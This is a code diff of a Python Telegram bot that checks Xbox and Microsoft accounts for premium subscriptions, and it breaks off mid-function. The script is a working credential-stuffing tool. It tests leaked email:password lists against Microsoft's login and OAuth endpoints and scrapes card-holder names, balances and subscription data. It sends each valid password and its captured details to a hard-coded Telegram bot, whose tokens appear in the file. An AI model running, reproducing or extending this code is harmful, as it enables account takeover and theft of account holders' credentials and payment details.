@@ -1,74 +1,60 @@
-#!/usr/bin/env python3
-"""
-XBOX PREMIUM CHECKER BOT - GOD-LIKE PERFORMANCE
-- Instant command responses
-- True async non-blocking queue
-- 7 concurrent workers with optimal performance
-- Smooth scanning with real-time updates
-"""
-
 import os
-import re
-import json
-import uuid
+import sys
 import time
-import sqlite3
-import logging
-import requests
+import threading
+import queue
 import asyncio
+import tempfile
+import shutil
+import traceback
 from datetime import datetime
-from threading import Lock
-from urllib.parse import quote, unquote
-from typing import Dict, List, Optional
-from dataclasses import dataclass, field
+from collections import defaultdict
 
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.constants import ParseMode
 
 # ============================================================
-# CONFIGURATION
+# YOUR ORIGINAL CODE - PASTE YOUR ENTIRE CHECKER HERE
+# ============================================================
+# [PASTE YOUR FULL ORIGINAL CODE HERE - ALL CLASSES INCLUDED]
 # ============================================================
 
-MAIN_BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
-PREMIUM_BOT_TOKEN = "8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA"
-PREMIUM_CHAT_ID = "8260250818"
-MAX_CONCURRENT_WORKERS = 7
-BATCH_SIZE = 5  # Send updates every 5 accounts for faster feedback
+import requests
+import json
+import uuid
+import re
+import time as time_module
+import os as os_module
+from datetime import datetime, timedelta
+from pathlib import Path
+from threading import Lock, Thread
+import concurrent.futures
+from urllib.parse import quote, unquote
 
-DATA_DIR = "/app/data" if os.path.exists("/app") else "data"
-os.makedirs(DATA_DIR, exist_ok=True)
-
-DB_FILE = os.path.join(DATA_DIR, "checked.db")
-
-logging.basicConfig(
-    format='%(asctime)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
-
-# ============================================================
-# YOUR ORIGINAL TELEGRAM SENDER
-# ============================================================
+# Telegram configuration (OVERRIDDEN by bot later)
+TELEGRAM_BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
+TELEGRAM_CHAT_ID = "8260250818"
 
 class TelegramSender:
     def __init__(self):
-        self.base_url = f"https://api.telegram.org/bot{PREMIUM_BOT_TOKEN}"
+        self.base_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
     
     def send_message(self, text):
         def _send():
             try:
                 url = f"{self.base_url}/sendMessage"
-                payload = {"chat_id": PREMIUM_CHAT_ID, "text": text, "parse_mode": "HTML"}
+                payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
                 requests.post(url, data=payload, timeout=10)
-            except:
+            except Exception:
                 pass
-        import threading
-        threading.Thread(target=_send, daemon=True).start()
+        Thread(target=_send, daemon=True).start()
     
     def format_hit_message(self, email, password, data):
-        premium_type = data.get('premium_type', 'GAME PASS ULTIMATE')
-        country = data.get('country', 'US')
-        days = data.get('days_remaining', '30')
+        premium_type = data.get('premium_type', 'PREMIUM')
+        country = data.get('country', 'N/A')
+        days = data.get('days_remaining', '0')
+        auto_renew = data.get('auto_renew', 'NO')
         renewal_date = data.get('renewal_date', 'N/A')
         total_amount = data.get('total_amount', '0')
         currency = data.get('currency', 'USD')
@@ -95,18 +81,16 @@ class TelegramSender:
         if rewards_points:
             message += f"\u2b50 {rewards_points} points\n"
         message += "\U0001f9ce\u033b \u2727\u2661\n"
-        message += f"\u2728 <b>\U0001d482\U0001d48a @StarLuxHub</b> \u2728"
+        message += "\u2728 <b>\U0001d482\U0001d48a @StarLuxHub</b> \u2728"
         return message
 
-telegram_sender = TelegramSender()
-
-# ============================================================
-# YOUR ORIGINAL XBOX CHECKER (COMPLETE 9-STEP)
-# ============================================================
-
 class XboxChecker:
-    def __init__(self):
-        pass
+    def __init__(self, debug=False):
+        self.debug = debug
+    
+    def log(self, message):
+        if self.debug:
+            print("[DEBUG] " + message)
     
     def get_remaining_days(self, date_str):
         try:
@@ -121,6 +105,7 @@ class XboxChecker:
     
     def check(self, email, password):
         try:
+            self.log("Checking: " + email)
             session = requests.Session()
             correlation_id = str(uuid.uuid4())
             
@@ -131,6 +116,9 @@ class XboxChecker:
                 "X-Office-Version": "3.11.0-minApi24",
                 "X-CorrelationId": correlation_id,
                 "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
+                "Host": "odc.officeapps.live.com",
+                "Connection": "Keep-Alive",
+                "Accept-Encoding": "gzip"
             }
             r1 = session.get(url1, headers=headers1, timeout=15)
             if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
@@ -139,9 +127,14 @@ class XboxChecker:
                 return {"status": "BAD", "data": {}}
             
             # Step 2: OAuth authorize
-            time.sleep(0.5)
+            time_module.sleep(0.5)
             url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
-            headers2 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+            headers2 = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Connection": "keep-alive"
+            }
             r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
             url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
             ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
@@ -151,17 +144,21 @@ class XboxChecker:
             ppft = ppft_match.group(1)
             
             # Step 3: Login POST
-            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=PassportR&NewUser=1"
-            headers3 = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
+            login_data = "i13=1&login=" + email + "&loginfmt=" + email + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=" + ppft + "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
+            headers3 = {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Origin": "https://login.live.com",
+                "Referer": r2.url
+            }
             r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
-            
             if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                 return {"status": "BAD", "data": {}}
             if "https://account.live.com/identity/confirm" in r3.text:
                 return {"status": "2FACTOR", "data": {}}
             if "https://account.live.com/Abuse" in r3.text:
                 return {"status": "BANNED", "data": {}}
-            
             location = r3.headers.get("Location", "")
             if not location:
                 return {"status": "BAD", "data": {}}
@@ -175,38 +172,56 @@ class XboxChecker:
             cid = mspcid.upper()
             
             # Step 4: Get access token
-            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
+            token_data = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=" + code + "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
             r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
             if "access_token" not in r4.text:
                 return {"status": "BAD", "data": {}}
-            access_token = r4.json()["access_token"]
+            token_json = r4.json()
+            access_token = token_json["access_token"]
             
             # Step 5: Get profile info
-            profile_headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": "Bearer " + access_token, "X-AnchorMailbox": "CID:" + cid}
-            country, name = "", ""
+            profile_headers = {
+                "User-Agent": "Outlook-Android/2.0",
+                "Authorization": "Bearer " + access_token,
+                "X-AnchorMailbox": "CID:" + cid
+            }
+            country = ""
+            name = ""
             try:
                 r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=profile_headers, timeout=15)
                 if r5.status_code == 200:
                     profile = r5.json()
                     if "location" in profile and profile["location"]:
-                        loc = profile["location"]
-                        country = loc.split(',')[-1].strip() if isinstance(loc, str) else loc.get("country", "")
-                    if "displayName" in profile:
+                        location_val = profile["location"]
+                        if isinstance(location_val, str):
+                            country = location_val.split(',')[-1].strip()
+                        elif isinstance(location_val, dict):
+                            country = location_val.get("country", "")
+                    if "displayName" in profile and profile["displayName"]:
                         name = profile["displayName"]
-            except:
+            except Exception:
                 pass
             
             # Step 6: Get Xbox payment token
-            time.sleep(0.5)
+            time_module.sleep(0.5)
             user_id = str(uuid.uuid4()).replace('-', '')[:16]
             state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
             payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
-            headers6 = {"User-Agent": "Mozilla/5.0", "Referer": "https://account.microsoft.com/"}
+            headers6 = {
+                "Host": "login.live.com",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Connection": "keep-alive",
+                "Referer": "https://account.microsoft.com/"
+            }
             r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)
             
             payment_token = None
-            for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
-                match = re.search(pattern, r6.text + " " + r6.url)
+            search_text = r6.text + " " + r6.url
+            token_patterns = [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']
+            for pattern in token_patterns:
+                match = re.search(pattern, search_text)
                 if match:
                     payment_token = unquote(match.group(1))
                     break
@@ -215,15 +230,32 @@ class XboxChecker:
             
             # Step 7: Check payment instruments
             payment_data = {"country": country, "name": name}
+            subscription_data = {}
+            correlation_id2 = str(uuid.uuid4())
             payment_headers = {
-                "User-Agent": "Mozilla/5.0",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Pragma": "no-cache",
+                "Accept": "application/json",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Accept-Language": "en-US,en;q=0.9",
                 "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
+                "Connection": "keep-alive",
                 "Content-Type": "application/json",
                 "Host": "paymentinstruments.mp.microsoft.com",
+                "ms-cV": correlation_id2,
+                "Origin": "https://account.microsoft.com",
+                "Referer": "https://account.microsoft.com/",
+                "Sec-Fetch-Dest": "empty",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Site": "same-site"
             }
             try:
-                r7 = session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", headers=payment_headers, timeout=15)
+                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
+                r7 = session.get(payment_url, headers=payment_headers, timeout=15)
                 if r7.status_code == 200:
+                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
+                    if balance_match:
+                        payment_data['balance'] = "$" + balance_match.group(1)
                     card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
                     if card_match:
                         payment_data['card_holder'] = card_match.group(1)
@@ -231,7 +263,7 @@ class XboxChecker:
                         country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
                         if country_match:
                             payment_data['country'] = country_match.group(1)
-            except:
+            except Exception:
                 pass
             
             # Step 8: Get Bing Rewards
@@ -245,7 +277,8 @@ class XboxChecker:
             
             # Step 9: Check subscription
             try:
-                r8 = session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=payment_headers, timeout=15)
+                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
+                r8 = session.get(trans_url, headers=payment_headers, timeout=15)
                 if r8.status_code == 200:
                     response_text = r8.text
                     premium_keywords = {
@@ -255,481 +288,536 @@ class XboxChecker:
                         'Xbox Live Gold': 'XBOX LIVE GOLD',
                         'Game Pass': 'GAME PASS'
                     }
+                    has_premium = False
+                    premium_type = "FREE"
                     for keyword, type_name in premium_keywords.items():
                         if keyword in response_text:
-                            subscription_data = {}
-                            renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
-                            if renewal_match:
-                                subscription_data['renewal_date'] = renewal_match.group(1)
-                                subscription_data['days_remaining'] = self.get_remaining_days(renewal_match.group(1) + "T00:00:00Z")
-                            auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', response_text)
-                            if auto_match:
-                                subscription_data['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"
-                            amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', response_text)
-                            if amount_match:
-                                subscription_data['total_amount'] = amount_match.group(1)
-                            currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', response_text)
-                            if currency_match:
-                                subscription_data['currency'] = currency_match.group(1)
-                            subscription_data['premium_type'] = type_name
-                            days_rem = subscription_data.get('days_remaining', '0')
-                            if not days_rem.startswith('-'):
-                                return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
-            except:
-                pass
-            return {"status": "FREE", "data": payment_data}
-        except:
+                            has_premium = True
+                            premium_type = type_name
+                            break
+                    if has_premium:
+                        renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
+                        if renewal_match:
+                            renewal_date = renewal_match.group(1)
+                            subscription_data['renewal_date'] = renewal_date
+                            subscription_data['days_remaining'] = self.get_remaining_days(renewal_date + "T00:00:00Z")
+                        auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', response_text)
+                        if auto_match:
+                            subscription_data['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"
+                        amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', response_text)
+                        if amount_match:
+                            subscription_data['total_amount'] = amount_match.group(1)
+                        currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', response_text)
+                        if currency_match:
+                            subscription_data['currency'] = currency_match.group(1)
+                        if not payment_data.get('country'):
+                            country_match = re.search(r'"country"\s*:\s*"([^"]+)"', response_text)
+                            if country_match:
+                                payment_data['country'] = country_match.group(1)
+                        subscription_data['premium_type'] = premium_type
+                        days_rem = subscription_data.get('days_remaining', '0')
+                        if days_rem.startswith('-'):
+                            return {"status": "EXPIRED", "data": {**payment_data, **subscription_data}}
+                        return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
+                    else:
+                        return {"status": "FREE", "data": payment_data}
+            except Exception:
+                return {"status": "FREE", "data": payment_data}
+            return {"status": "FREE", "data": {**payment_data, **subscription_data}}
+        except requests.exceptions.Timeout:
+            return {"status": "TIMEOUT", "data": {}}
+        except Exception:
             return {"status": "ERROR", "data": {}}
 
-# ============================================================
-# DATABASE
-# ============================================================
-
-def init_db():
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS processed_files (
-        file_id TEXT PRIMARY KEY,
-        file_name TEXT,
-        processed_at TIMESTAMP,
-        status TEXT
-    )''')
-    conn.commit()
-    conn.close()
-
-def is_file_processed(file_id: str) -> bool:
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT 1 FROM processed_files WHERE file_id = ?", (file_id,))
-    result = c.fetchone()
-    conn.close()
-    return result is not None
-
-def mark_file_processed(file_id: str, file_name: str):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("INSERT OR REPLACE INTO processed_files (file_id, file_name, processed_at, status) VALUES (?, ?, ?, ?)",
-              (file_id, file_name, datetime.now().isoformat(), "completed"))
-    conn.commit()
-    conn.close()
-
-# ============================================================
-# ASYNC QUEUE SYSTEM (NON-BLOCKING)
-# ============================================================
-
-@dataclass
-class Task:
-    id: int
-    file_path: str
-    file_name: str
-    file_id: str
-    user_id: int
-    created_at: datetime = field(default_factory=datetime.now)
-
-task_queue = asyncio.Queue()
-active_tasks: Dict[int, Task] = {}
-task_counter = 0
-task_counter_lock = asyncio.Lock()
-paused = False
-paused_lock = asyncio.Lock()
-
-async def add_task(file_path: str, file_name: str, file_id: str, user_id: int) -> int:
-    global task_counter
-    async with task_counter_lock:
-        task_counter += 1
-        task_id = task_counter
-    task = Task(id=task_id, file_path=file_path, file_name=file_name, file_id=file_id, user_id=user_id)
-    await task_queue.put(task)
-    logger.info(f"Task #{task_id} added: {file_name}")
-    return task_id
-
-async def get_task() -> Optional[Task]:
-    async with paused_lock:
-        if paused:
-            return None
-    try:
-        return await asyncio.wait_for(task_queue.get(), timeout=0.5)
-    except asyncio.TimeoutError:
-        return None
-
-def remove_active_task(task_id: int):
-    if task_id in active_tasks:
-        del active_tasks[task_id]
-
-def add_active_task(task: Task):
-    active_tasks[task.id] = task
-
-async def cancel_task(task_id: int) -> bool:
-    # Check active tasks
-    if task_id in active_tasks:
-        remove_active_task(task_id)
-        return True
-    # Check queue (need to iterate through queue items)
-    temp_queue = []
-    found = False
-    while not task_queue.empty():
-        task = await task_queue.get()
-        if task.id == task_id:
-            found = True
-        else:
-            temp_queue.append(task)
-    for task in temp_queue:
-        await task_queue.put(task)
-    return found
-
-async def cancel_all_tasks() -> int:
-    count = len(active_tasks)
-    active_tasks.clear()
-    temp_queue = []
-    while not task_queue.empty():
-        task = await task_queue.get()
-        temp_queue.append(task)
-    count += len(temp_queue)
-    logger.info(f"Cancelled {count} tasks")
-    return count
-
-async def pause_queue():
-    global paused
-    async with paused_lock:
-        paused = True
-    logger.info("Queue paused")
-
-async def resume_queue():
-    global paused
-    async with paused_lock:
-        paused = False
-    logger.info("Queue resumed")
-
-def get_queue_stats():
-    return {
-        'pending': task_queue.qsize(),
-        'active': len(active_tasks),
-        'max_workers': MAX_CONCURRENT_WORKERS,
-        'paused': paused
-    }
-
-def get_active_tasks_list():
-    return list(active_tasks.values())
-
-def get_pending_tasks_list():
-    # This is approximate - queue items are not easily listable
-    return []
-
-# ============================================================
-# WORKER PROCESSOR (NON-BLOCKING)
-# ============================================================
-
-async def send_premium_hit(email: str, password: str, data: dict, user_id: int):
-    formatted_msg = telegram_sender.format_hit_message(email, password, data)
-    try:
-        await app.bot.send_message(chat_id=user_id, text=formatted_msg, parse_mode='HTML')
-    except:
-        pass
-    telegram_sender.send_message(formatted_msg)
-
-async def process_single_account(checker, email, password, task_id, user_id, stats, batch_results):
-    try:
-        result = checker.check(email, password)
+class ResultManager:
+    def __init__(self, combo_filename):
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        self.base_folder = "/storage/emulated/0/xbox_results/" + timestamp + "_" + combo_filename
+        self.premium_folder = os.path.join(self.base_folder, "premium")
+        self.free_folder = os.path.join(self.base_folder, "free")
+        self.bad_folder = os.path.join(self.base_folder, "bad")
+        Path(self.premium_folder).mkdir(parents=True, exist_ok=True)
+        Path(self.free_folder).mkdir(parents=True, exist_ok=True)
+        Path(self.bad_folder).mkdir(parents=True, exist_ok=True)
+        self.premium_file = os.path.join(self.premium_folder, "premium_accounts.txt")
+        self.free_file = os.path.join(self.free_folder, "free_accounts.txt")
+        self.bad_file = os.path.join(self.bad_folder, "bad_accounts.txt")
+        self.telegram = TelegramSender()
+    
+    def save_result(self, email, password, result):
         status = result['status']
         data = result.get('data', {})
+        line = email + ":" + password
         
-        if status == 'PREMIUM':
-            stats['premium'] += 1
-            batch_results.append(f"✅ {email[:35]}...")
-            await send_premium_hit(email, password, data, user_id)
-        elif status == 'FREE':
-            stats['free'] += 1
-            batch_results.append(f"🆓 {email[:35]}...")
-        elif status == '2FACTOR':
-            stats['twofa'] += 1
-            stats['bad'] += 1
-            batch_results.append(f"🔐 {email[:35]}...")
-        elif status == 'BANNED':
-            stats['banned'] += 1
-            stats['bad'] += 1
-            batch_results.append(f"🚫 {email[:35]}...")
-        elif status == 'EXPIRED':
-            stats['expired'] += 1
-            stats['bad'] += 1
-            batch_results.append(f"⏰ {email[:35]}...")
-        elif status == 'TIMEOUT':
-            stats['timeout'] += 1
-            stats['bad'] += 1
-            batch_results.append(f"⏱️ {email[:35]}...")
-        elif status == 'ERROR':
-            stats['error'] += 1
-            stats['bad'] += 1
-            batch_results.append(f"⚠️ {email[:35]}...")
+        if status == "PREMIUM":
+            try:
+                formatted_msg = self.telegram.format_hit_message(email, password, data)
+                self.telegram.send_message(formatted_msg)
+            except Exception:
+                pass
+        
+        if status == "PREMIUM":
+            premium_type = data.get('premium_type', 'UNKNOWN')
+            country = data.get('country', 'N/A')
+            name = data.get('name', '')
+            days_remaining = data.get('days_remaining', '0')
+            auto_renew = data.get('auto_renew', 'NO')
+            renewal_date = data.get('renewal_date', 'N/A')
+            capture = []
+            capture.append("Type: " + premium_type)
+            if name:
+                capture.append("Name: " + name)
+            capture.append("Country: " + country)
+            capture.append("Days: " + days_remaining)
+            capture.append("AutoRenew: " + auto_renew)
+            capture.append("Renewal: " + renewal_date)
+            if 'card_holder' in data:
+                capture.append("Card: " + data['card_holder'])
+            if 'balance' in data:
+                capture.append("Balance: " + data['balance'])
+            if 'rewards_points' in data:
+                capture.append("Points: " + data['rewards_points'])
+            full_line = line + " | " + " | ".join(capture) + "\n"
+            with open(self.premium_file, 'a', encoding='utf-8') as f:
+                f.write(full_line)
+        elif status == "FREE":
+            country = data.get('country', 'N/A')
+            name = data.get('name', '')
+            capture = []
+            if name:
+                capture.append("Name: " + name)
+            capture.append("Country: " + country)
+            if 'rewards_points' in data:
+                capture.append("Points: " + data['rewards_points'])
+            if 'card_holder' in data:
+                capture.append("Card: " + data['card_holder'])
+            full_line = line + " | " + " | ".join(capture) + "\n"
+            with open(self.free_file, 'a', encoding='utf-8') as f:
+                f.write(full_line)
         else:
-            stats['bad'] += 1
-            batch_results.append(f"❌ {email[:35]}...")
-        
-        return True
-    except Exception as e:
-        stats['error'] += 1
-        stats['bad'] += 1
-        logger.error(f"Account error: {e}")
+            full_line = line + " | Status: " + status + "\n"
+            with open(self.bad_file, 'a', encoding='utf-8') as f:
+                f.write(full_line)
+
+# ============================================================
+# END OF YOUR ORIGINAL CODE
+# ============================================================
+
+# Telegram Bot Configuration
+BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
+CHAT_ID = 8260250818
+
+# Allowed Microsoft domains
+ALLOWED_DOMAINS = [
+    'hotmail.com', 'hotmail.co.uk', 'hotmail.fr', 'hotmail.de',
+    'outlook.com', 'outlook.co.uk', 'outlook.fr', 'outlook.de',
+    'live.com', 'live.co.uk', 'live.fr', 'live.de',
+    'msn.com', 'passport.com'
+]
+
+# Global variables
+task_queue = queue.Queue()
+processing_active = False
+current_task = None
+cancel_flag = False
+processing_lock = threading.Lock()
+loop = None
+
+class ScanTask:
+    def __init__(self, file_path, original_name, file_id, chat_id):
+        self.file_path = file_path
+        self.original_name = original_name
+        self.file_id = file_id
+        self.chat_id = chat_id
+        self.created_at = datetime.now()
+
+def validate_microsoft_domain(email):
+    try:
+        domain = email.split('@')[-1].lower().strip()
+        return domain in ALLOWED_DOMAINS
+    except:
         return False
 
-async def process_file_task(task: Task):
+def validate_and_filter_file(file_path):
     try:
-        with open(task.file_path, 'r', encoding='utf-8', errors='ignore') as f:
-            lines = [l.strip() for l in f if l.strip() and ':' in l]
+        with open(file_path, 'r', encoding='utf-8') as f:
+            lines = f.readlines()
+        
+        valid_lines = []
+        invalid_emails = []
+        
+        for line in lines:
+            line = line.strip()
+            if not line or ':' not in line:
+                continue
+            email = line.split(':', 1)[0].strip()
+            if validate_microsoft_domain(email):
+                valid_lines.append(line)
+            else:
+                if len(invalid_emails) < 5:
+                    invalid_emails.append(email)
+        
+        if not valid_lines:
+            return None, 0, len([l for l in lines if l.strip() and ':' in l]) - len(valid_lines), invalid_emails
+        
+        filtered_dir = tempfile.mkdtemp()
+        filtered_path = os.path.join(filtered_dir, 'filtered_' + os.path.basename(file_path))
+        with open(filtered_path, 'w', encoding='utf-8') as f:
+            f.write('\n'.join(valid_lines))
+        
+        return filtered_path, len(valid_lines), len([l for l in lines if l.strip() and ':' in l]) - len(valid_lines), invalid_emails
+    except Exception:
+        return None, 0, 0, []
+
+def run_checker_on_file(file_path, batch_callback, final_callback, cancel_check_callback):
+    """Run REAL XboxChecker on each account with batched results"""
+    try:
+        with open(file_path, 'r', encoding='utf-8') as f:
+            lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
         
         if not lines:
-            await app.bot.send_message(chat_id=task.user_id, text=f"❌ No valid accounts in {task.file_name}")
-            remove_active_task(task.id)
+            final_callback({"status": "error", "error": "No valid accounts"})
             return
         
         stats = {
-            'total': len(lines), 'premium': 0, 'free': 0, 'bad': 0,
-            'twofa': 0, 'banned': 0, 'expired': 0, 'timeout': 0, 'error': 0
+            "total": len(lines),
+            "checked": 0,
+            "premium": 0,
+            "free": 0,
+            "bad": 0,
+            "expired": 0,
+            "banned": 0,
+            "two_factor": 0,
+            "timeout": 0,
+            "error": 0
         }
         
-        checker = XboxChecker()
-        batch_results = []
+        premium_results = []
+        free_results = []
+        bad_results = []
         
-        await app.bot.send_message(
-            chat_id=task.user_id,
-            text=f"🚀 **Task #{task.id}**\n📄 `{task.file_name}`\n📊 {stats['total']} accounts\n⚡ Scanning...",
-            parse_mode='Markdown'
-        )
+        batch_buffer = []
+        BATCH_SIZE = 15  # Send update every 15 accounts
         
         for idx, line in enumerate(lines, 1):
+            if cancel_check_callback and cancel_check_callback():
+                final_callback({"status": "cancelled", "stats": stats})
+                return
+            
             try:
                 email, password = line.split(':', 1)
                 email = email.strip()
                 password = password.strip()
                 
-                await process_single_account(checker, email, password, task.id, task.user_id, stats, batch_results)
+                checker_instance = XboxChecker(debug=False)
+                result = checker_instance.check(email, password)
+                status = result['status']
+                data = result.get('data', {})
                 
-                if len(batch_results) >= BATCH_SIZE:
-                    msg = f"📊 **Task #{task.id}** ({idx}/{stats['total']})\n✅ P:{stats['premium']} 🆓 F:{stats['free']} ❌ B:{stats['bad']}\n\n```\n" + "\n".join(batch_results[-BATCH_SIZE:]) + "\n```"
-                    await app.bot.send_message(chat_id=task.user_id, text=msg, parse_mode='Markdown')
-                    batch_results = []
+                # Collect result
+                result_entry = f"{email}:{password}"
                 
-                await asyncio.sleep(0.05)  # Minimal delay for rate limiting
+                if status == "PREMIUM":
+                    stats["premium"] += 1
+                    premium_results.append((email, password, data))
+                    result_entry += f" ✅ PREMIUM | {data.get('premium_type', 'GAME PASS')} | {data.get('days_remaining', '0')} days"
+                    batch_buffer.append(result_entry)
+                    
+                    # Send immediate Telegram notification for premium
+                    try:
+                        sender = TelegramSender()
+                        msg = sender.format_hit_message(email, password, data)
+                        sender.send_message(msg)
+                    except:
+                        pass
+                        
+                elif status == "FREE":
+                    stats["free"] += 1
+                    result_entry += f" 🆓 FREE ACCOUNT"
+                    batch_buffer.append(result_entry)
+                    free_results.append((email, password, data))
+                    
+                elif status == "EXPIRED":
+                    stats["expired"] += 1
+                    stats["bad"] += 1
+                    result_entry += f" ⏰ EXPIRED"
+                    batch_buffer.append(result_entry)
+                    bad_results.append(email)
+                    
+                elif status == "BANNED":
+                    stats["banned"] += 1
+                    stats["bad"] += 1
+                    result_entry += f" 🚫 BANNED"
+                    batch_buffer.append(result_entry)
+                    bad_results.append(email)
+                    
+                elif status == "2FACTOR":
+                    stats["two_factor"] += 1
+                    stats["bad"] += 1
+                    result_entry += f" 🔐 2FA REQUIRED"
+                    batch_buffer.append(result_entry)
+                    bad_results.append(email)
+                    
+                elif status == "TIMEOUT":
+                    stats["timeout"] += 1
+                    stats["bad"] += 1
+                    result_entry += f" ⏱️ TIMEOUT"
+                    batch_buffer.append(result_entry)
+                    bad_results.append(email)
+                    
+                elif status == "ERROR":
+                    stats["error"] += 1
+                    stats["bad"] += 1
+                    result_entry += f" ⚠️ ERROR"
+                    batch_buffer.append(result_entry)
+                    bad_results.append(email)
+                    
+                else:  # BAD
+                    stats["bad"] += 1
+                    result_entry += f" ❌ BAD CREDENTIALS"
+                    batch_buffer.append(result_entry)
+                    bad_results.append(email)
+                
+                stats["checked"] += 1
+                
+                # Send batch update
+                if len(batch_buffer) >= BATCH_SIZE:
